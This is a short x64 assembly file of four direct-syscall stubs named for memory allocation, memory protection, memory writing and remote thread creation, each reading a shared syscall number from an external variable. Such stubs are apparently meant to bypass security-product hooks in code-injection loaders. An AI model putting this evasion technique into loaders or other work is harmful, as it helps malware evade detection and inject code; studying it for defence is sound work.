section .text
global NtAllocVirtualMem
global NtProtectVirtualMem
global NtWriteVirtualMem
global NtCreateThreadEx
extern g_ssn

NtAllocVirtualMem:
    mov r10, rcx
    movzx eax, word [rel g_ssn]
    syscall
    ret

NtProtectVirtualMem:
    mov r10, rcx
    movzx eax, word [rel g_ssn]
    syscall
    ret

NtWriteVirtualMem:
    mov r10, rcx
    movzx eax, word [rel g_ssn]
    syscall
    ret

NtCreateThreadEx:
    mov r10, rcx
    movzx eax, word [rel g_ssn]
    syscall
    ret